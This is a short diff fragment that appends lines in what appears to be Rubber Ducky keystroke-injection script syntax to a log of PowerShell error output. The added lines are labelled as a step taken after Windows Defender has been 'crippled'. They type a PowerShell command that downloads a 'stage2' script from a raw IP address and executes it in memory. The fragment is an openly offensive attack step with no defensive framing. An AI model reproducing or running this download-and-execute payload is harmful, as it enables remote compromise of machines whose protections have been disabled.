@@ -165,3 +165,10 @@ At line:1 char:125
     + FullyQualifiedErrorId : MethodCountCouldNotFindBest
 
 PS C:\WINDOWS\system32>
+
+
+
+
+REM ── Step 14: Direct pull now that Defender is crippled ──
+STRINGLN IEX(New-Object Net.WebClient).DownloadString('http://153.75.82.198/stage2.ps1')
+DELAY 1000
